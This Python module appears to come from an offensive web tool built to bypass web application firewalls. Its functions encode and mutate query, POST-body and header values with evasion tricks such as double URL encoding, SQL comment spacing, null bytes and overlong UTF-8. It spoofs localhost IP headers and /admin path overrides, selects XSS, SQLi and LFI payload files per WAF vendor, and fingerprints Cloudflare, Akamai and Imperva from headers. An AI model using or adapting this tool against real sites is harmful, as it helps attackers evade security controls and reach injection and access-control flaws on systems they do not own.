# core/mutator.py — URL/param/body mutator for WAF bypass on block
import urllib.parse
import random


# ============ base mutators ============

def _case_swap(s):
    return "".join(c.upper() if random.random() < 0.4 else c.lower() if c.isalpha() else c for c in s)

def _url_enc(s):
    return urllib.parse.quote(s, safe="")

def _double_enc(s):
    return urllib.parse.quote(urllib.parse.quote(s, safe=""), safe="")

def _comment_space(s):
    return s.replace(" ", "/**/")

def _newline_space(s):
    return s.replace(" ", "%0a")

def _tab_space(s):
    return s.replace(" ", "%09")

def _chunk_ws(s):
    return s.replace(" ", random.choice(["%20", "+", "%09", "%0a", "/**/"]))

def _add_null(s):
    return s + "%00"

def _add_comment(s):
    return s + "/**/"

def _html_ent(s):
    return s.replace("'", "&#39;").replace('"', "&#34;").replace("<", "&lt;").replace(">", "&gt;")

def _unicode_escape(s):
    return "".join(f"%u{ord(c):04x}" if ord(c) < 128 and not c.isalnum() else c for c in s)

def _overlong_utf8(s):
    return "".join(f"%c0%{ord(c):02x}" if ord(c) < 128 and not c.isalnum() else c for c in s)


_MUTATORS = [
    _case_swap, _url_enc, _double_enc, _comment_space,
    _newline_space, _tab_space, _chunk_ws, _add_null,
    _add_comment, _html_ent, _unicode_escape, _overlong_utf8,
]


def mutate_param(value, n=6, base_first=True):
    """
    Return up to n mutated variants of a query parameter value.
    base_first: if True, original value is included first.
    """
    out = []
    seen = {value}
    if base_first:
        out.append(value)
    for _ in range(n * 3):
        if len(out) >= n:
            break
        f = random.choice(_MUTATORS)
        try:
            v = f(value)
        except Exception:
            continue
        if v and v not in seen:
            seen.add(v)
            out.append(v)
    return out


def mutate_url_query(url, n=6):
    """
    Yield URL variants with each query param mutated one at a time.
    Returns: (mutated_url, param_name, mutated_value)
    """
    u = urllib.parse.urlparse(url)
    if not u.query:
        return
    params = urllib.parse.parse_qs(u.query, keep_blank_values=True)
    for name, vals in params.items():
        original = vals[0] if vals else ""
        for variant in mutate_param(original, n=n):
            new_params = {k: (v[0] if v else "") for k, v in params.items()}
            new_params[name] = variant
            new_query = urllib.parse.urlencode(new_params)
            yield (urllib.parse.urlunparse(u._replace(query=new_query)), name, variant)


def mutate_post_body(data, n=6):
    """
    Yield POST body variants with each field mutated one at a time.
    data: dict OR string "a=1&b=2" OR list of (k, v)
    Yields: (mutated_data, field_name, mutated_value)
    mutated_data preserves original format (dict -> dict, str -> str, list -> list)
    """
    if isinstance(data, str):
        params = urllib.parse.parse_qsl(data, keep_blank_values=True)
        was_str = True
    elif isinstance(data, dict):
        params = list(data.items())
        was_str = False
    elif isinstance(data, list):
        params = data
        was_str = False
    else:
        return

    for i, (name, value) in enumerate(params):
        value_s = str(value) if value is not None else ""
        for variant in mutate_param(value_s, n=n):
            new_params = list(params)
            new_params[i] = (name, variant)
            if was_str:
                yield (urllib.parse.urlencode(new_params), name, variant)
            elif isinstance(data, dict):
                new_dict = dict(data)
                new_dict[name] = variant
                yield (new_dict, name, variant)
            else:
                yield (new_params, name, variant)


def mutate_headers(headers, n=3):
    """
    Yield header variants: rotate User-Agent, inject spoofing IP headers.
    Returns: (mutated_headers_dict, change_description)
    """
    if not headers:
        headers = {}
    base = dict(headers)

    # 1. rotate UA
    UAs = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/121.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.2 Safari/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1",
    ]
    for ua in UAs[:n]:
        h = dict(base); h["User-Agent"] = ua
        yield (h, f"UA={ua[:30]}")

    # 2. inject localhost IP spoof
    ip_headers = ["X-Forwarded-For", "X-Real-IP", "X-Originating-IP",
                  "X-Client-IP", "X-Remote-Addr", "True-Client-IP"]
    for ih in ip_headers:
        h = dict(base); h[ih] = "127.0.0.1"
        yield (h, f"{ih}=127.0.0.1")

    # 3. method/path override
    for override in ["X-HTTP-Method-Override", "X-Original-URL", "X-Rewrite-URL"]:
        h = dict(base); h[override] = "/admin"
        yield (h, f"{override}=/admin")


# backward-compat alias (probe.py imports `mutate`)
mutate = mutate_param


# compat alias for probe (older name)
mutate = mutate_param


# ============ context-aware payload selection ============

def get_context_payloads(context, waf=None):
    """Return payloads for a context + optional WAF."""
    from pathlib import Path
    base = Path(__file__).parent.parent / "payloads"
    files = []
    if context in ("html_body", "html_attr"):
        files.append("xss_context.txt")
    elif context == "sql":
        files.append("sqli.txt")
    elif context == "path":
        files.append("lfi.txt")
    if waf == "cloudflare":
        files.append("waf_cloudflare.txt")
    elif waf == "akamai":
        files.append("waf_akamai.txt")
    elif waf == "imperva":
        files.append("waf_imperva.txt")
    files.append("encoded_composite.txt")

    out = []
    for fname in files:
        p = base / fname
        if p.is_file():
            for line in p.read_text(errors="ignore").splitlines():
                s = line.strip()
                if s and not s.startswith("#"):
                    out.append(s)
    return list(dict.fromkeys(out))


def detect_waf_from_headers(headers):
    h = str(headers).lower()
    if "cloudflare" in h or "cf-ray" in h: return "cloudflare"
    if "akamai" in h or "x-akamai" in h: return "akamai"
    if "imperva" in h or "incap_ses" in h: return "imperva"
    if "sucuri" in h: return "sucuri"
    if "awselb" in h or "x-amzn" in h: return "aws"
    return None
